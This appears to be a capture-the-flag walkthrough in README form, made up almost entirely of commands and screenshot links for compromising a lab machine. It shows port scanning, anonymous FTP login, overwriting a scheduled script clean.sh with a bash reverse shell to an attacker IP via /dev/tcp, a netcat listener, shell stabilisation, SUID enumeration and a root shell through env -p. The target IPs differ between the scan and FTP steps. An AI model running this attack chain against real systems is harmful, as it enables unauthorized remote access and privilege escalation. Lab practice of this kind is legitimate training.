<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/068504b7-6b64-4f43-9cf3-dfd3332ff13c"></picture>
<h1 align="center"><picture><img src = "https://github.com/user-attachments/assets/b30f7ed0-a42b-4f65-a21e-bbac74ebf87e"></picture></h1>

  ```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allports
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![image](https://github.com/user-attachments/assets/d3212d58-f71f-447a-8b84-6fb548b85688)
![image](https://github.com/user-attachments/assets/75f18b27-5568-4fc8-99c2-4c25d613c19b)

```bash
ftp 10.10.44.169
```
Usuario : anonymous <br>
Passwd : 
![image](https://github.com/user-attachments/assets/bb2949af-0f23-4823-a4c4-d56bd78dc1a6)

```bash
cat clean.sh
```
![image](https://github.com/user-attachments/assets/63ff8512-fe5e-47a7-b812-c4e7a31521f4)

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.21.118.81/443 0>&1
```
![image](https://github.com/user-attachments/assets/7a0f08e4-bad8-4f40-bd28-035f2013d764)

```bash
ftp 10.10.44.169
```
Usuario : anonymous <br>
Passwd : 

```bash
cd scripts
put clean.sh
```
![image](https://github.com/user-attachments/assets/3b41d96f-4567-4a9f-9d7a-cd8eda88acaf)

```bash
nc -nlvp 443
```
![image](https://github.com/user-attachments/assets/cf470034-3e08-486a-835f-903af176b1a5)



![image](https://github.com/user-attachments/assets/40406fc6-c84b-4b1b-b3c5-8a7cbebd9431)

```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

![image](https://github.com/user-attachments/assets/7cd147de-4cb3-444c-916a-69a6a053c33a)


```bash
find / -perm -4000 2>/dev/null
```
![image](https://github.com/user-attachments/assets/c8a4e000-6389-4743-b81a-dd87af4c42b5)

```bash
/usr/bin/env /bin/sh -p
```
![image](https://github.com/user-attachments/assets/50304f5a-5e61-4c48-b444-c5b0b6bed376)


